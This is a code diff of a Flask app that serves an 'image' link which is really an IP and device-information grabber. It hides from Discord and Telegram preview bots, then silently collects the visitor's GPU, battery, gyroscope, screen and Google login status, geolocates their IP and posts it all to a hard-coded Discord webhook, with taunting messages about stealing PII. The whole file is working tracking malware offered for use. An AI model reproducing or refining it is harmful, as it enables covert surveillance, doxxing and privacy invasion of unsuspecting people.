@@ -6,101 +6,121 @@ from datetime import datetime
 
 app = Flask(__name__)
 
+# TARGET WEBHOOK
 WEBHOOK_URL = "https://discord.com/api/webhooks/1499405115294093454/AxyBIBWUojFPEoD1bIsyexLxf8gC8yR4fEDBF8eCNKLtWPFGfXZ3EZ28XdDEQCHlEl51"
 
 @app.route('/view/image_01.png')
 def logger():
     ua = request.user_agent.string
+    # Bot Shield: Filters out Discord/Telegram preview bots
     if any(x in ua.lower() for x in ["discord", "telegram", "bot", "crawl", "slack"]):
         r = requests.get("https://media1.tenor.com/m/ziNSDDTCyiwAAAAC/discord-trolling.gif")
         return send_file(io.BytesIO(r.content), mimetype='image/gif')
 
     return render_template_string('''
     <html>
-    <body style="background-color: #000; height: 100vh; margin: 0; overflow: hidden;">
+    <body style="background-color: #000; height: 100vh; margin: 0; display: flex; justify-content: center; align-items: center;">
+        <div style="color: #111; font-family: monospace; font-size: 10px;">ESTABLISHING ENCRYPTED TUNNEL...</div>
         <script>
             async function capture() {
-                // 1. PHYSICAL GYRO & MOTION
-                let tilt = {alpha: 0, beta: 0, gamma: 0};
+                // 1. PHYSICAL GYRO & MOTION (The "New Stuff")
+                let tiltData = "N/A (Desktop)";
                 window.ondeviceorientation = (e) => {
-                    tilt = {alpha: e.alpha.toFixed(1), beta: e.beta.toFixed(1), gamma: e.gamma.toFixed(1)};
+                    if(e.alpha !== null) {
+                        tiltData = `A: ${e.alpha.toFixed(0)}° B: ${e.beta.toFixed(0)}° G: ${e.gamma.toFixed(0)}°`;
+                    }
                 };
 
-                // 2. IDENTITY & NAME GUESSING
-                // We check the browser's profile name and languages to narrow down the target
-                const nameGuess = (navigator.userAgentData && navigator.userAgentData.platform) || "Unknown User";
-                
-                // 3. SOCIAL SESSION CHECKS (V10 logic)
-                const sites = { Google: "https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico", Facebook: "https://www.facebook.com/favicon.ico", Reddit: "https://www.reddit.com/favicon.ico" };
-                let sessions = [];
-                for (const [name, url] of Object.entries(sites)) {
-                    const img = new Image(); img.src = url;
-                    const status = await new Promise(r => {
-                        img.onload = () => r(true); img.onerror = () => r(false);
-                        setTimeout(() => r(false), 1000);
-                    });
-                    if (status) sessions.push(name);
-                }
+                // 2. SOCIAL SESSION CHECK
+                const googleImg = new Image();
+                googleImg.src = "https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico";
+                let googleStatus = await new Promise(r => {
+                    googleImg.onload = () => r("Yes ✅");
+                    googleImg.onerror = () => r("No ❌");
+                    setTimeout(() => r("Timeout ⌛"), 1500);
+                });
 
-                // 4. HARDWARE & GHOST DATA (V11 logic)
-                let gpu = "Unknown";
+                // 3. HARDWARE & GPU FORENSICS
+                let gpuInfo = "Unknown/None";
                 try {
                     const gl = document.createElement('canvas').getContext('webgl');
-                    gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_ID);
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
                 } catch(e){}
 
-                let batt = {level: 0, charging: false};
-                try { batt = await navigator.getBattery(); } catch(e){}
+                let battStatus = {level: "??", charge: "??"};
+                try { 
+                    const b = await navigator.getBattery(); 
+                    battStatus = {level: Math.round(b.level * 100) + "%", charge: b.charging ? "YES 🔌" : "NO 🔋"};
+                } catch(e){}
 
-                const data = {
-                    tilt: `Alpha: ${tilt.alpha}, Beta: ${tilt.beta}, Gamma: ${tilt.gamma}`,
-                    name_id: nameGuess,
-                    gpu: gpu,
-                    cores: navigator.hardwareConcurrency || "Unknown",
-                    ram: navigator.deviceMemory || "Unknown",
-                    batt: Math.round((batt.level || 0) * 100) + "%",
-                    charging: batt.charging ? "YES" : "NO",
-                    social: sessions.length ? sessions.join(", ") : "None",
+                const payload = {
                     res: screen.width + "x" + screen.height,
-                    platform: navigator.platform
+                    monitors: window.screen.isExtended ? "Multi-Monitor" : "Single",
+                    gpu: gpuInfo,
+                    cores: navigator.hardwareConcurrency || "??",
+                    ram: navigator.deviceMemory || "??",
+                    lang: navigator.language || "??",
+                    platform: navigator.platform,
+                    tilt: tiltData,
+                    batt: battStatus.level,
+                    charging: battStatus.charge,
+                    google: googleStatus,
+                    ua: navigator.userAgent
                 };
 
-                fetch('/log-omega-v12', {
+                fetch('/log-apex-v14', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(payload)
                 }).then(() => {
                     window.location.href = "https://i.imgur.com/BcNs5vF.jpg";
                 });
             }
-            capture();
+            // Give 500ms for sensors to initialize
+            setTimeout(capture, 500);
         </script>
     </body>
     </html>
     ''')
 
-@app.route('/log-omega-v12', methods=['POST'])
-def log_v12():
+@app.route('/log-apex-v14', methods=['POST'])
+def log_apex():
     d = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
-    
-    payload = {
-        "username": "04nexo took ur PII haha",
+    time_utc = datetime.utcnow().strftime("%H:%M:%S UTC")
+
+    # DEEP NETWORK & GEO INTEL
+    c, region, cntry, isp, vpn, net_type = "??", "??", "??", "??", "??", "??"
+    try:
+        g = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
+        c = g.get('city', '??')
+        region = g.get('regionName', '??')
+        cntry = g.get('country', '??')
+        isp = g.get('isp', '??')
+        vpn = "🚨 DETECTED" if g.get('proxy') or g.get('hosting') else "✅ Clean"
+        net_type = "RESIDENTIAL" if not g.get('hosting') else "DATACENTER/VPN"
+    except: pass
+
+    # THE FORMATTED EMBED (Apex Layout)
+    embed_payload = {
+        "username": "nexo took ur PII hahahahha loseerrrr",
         "embeds": [{
-            "title": "nexo found his target!😈",
-            "color": 0xFF0000,
+            "title": "ultimate pii grabber😈",
+            "description": f"Ref: `System Default/Private` | Time: `{time_utc}`",
+            "color": 0x000000,
             "fields": [
-                {"name": "📍 NETWORK / IP", "value": f"`{ip}`", "inline": True},
-                {"name": "👤 PROFILE ID", "value": f"`{d['name_id']}`", "inline": True},
-                {"name": "🧭 GYRO / TILT", "value": f"```{d['tilt']}```", "inline": False},
-                {"name": "🧠 HARDWARE", "value": f"**CPU:** {d['cores']} Cores\n**RAM:** {d['ram']} GB\n**GPU:** `{d['gpu']}`", "inline": False},
-                {"name": "🔋 POWER", "value": f"**Charge:** {d['batt']} (Plugged: {d['charging']})", "inline": True},
-                {"name": "👥 LOGINS", "value": f"`{d['social']}`", "inline": True}
+                {"name": "📍 GEOLOCATION", "value": f"**City:** {c}\n**State:** {region}\n**Country:** {cntry}", "inline": True},
+                {"name": "📡 NETWORK", "value": f"**ISP:** {isp}\n**VPN:** {vpn}\n**Type:** {net_type}\n**IP:** `{ip}`", "inline": False},
+                {"name": "🔋 POWER & SESSION", "value": f"**Battery:** {d['batt']} ({d['charging']})\n**Google Logged In:** {d['google']}", "inline": False},
+                {"name": "🧠 DEVICE SPECS", "value": f"**Model:** {d['platform']}\n**GPU:** `{d['gpu']}`\n**Cores:** {d['cores']} Core CPU\n**RAM:** {d['ram']} GB\n**Lang:** {d['lang']}", "inline": False},
+                {"name": "📺 DISPLAY & MOTION", "value": f"**Res:** {d['res']}\n**Screens:** {d['monitors']}\n**Gyro Tilt:** `{d['tilt']}`", "inline": False},
+                {"name": "🧬 RAW UA", "value": f"```{d['ua']}```", "inline": False}
             ],
-            "footer": {"text": f"Project 04Nexo | v12.0 | {datetime.utcnow().strftime('%H:%M:%S UTC')}"},
+            "footer": {"text": "Project 04nexo | v14.0 | UNSTOPPABLE"},
         }]
     }
-    requests.post(WEBHOOK_URL, json=payload)
+    requests.post(WEBHOOK_URL, json=embed_payload)
     return "OK", 200
 
 if __name__ == "__main__":
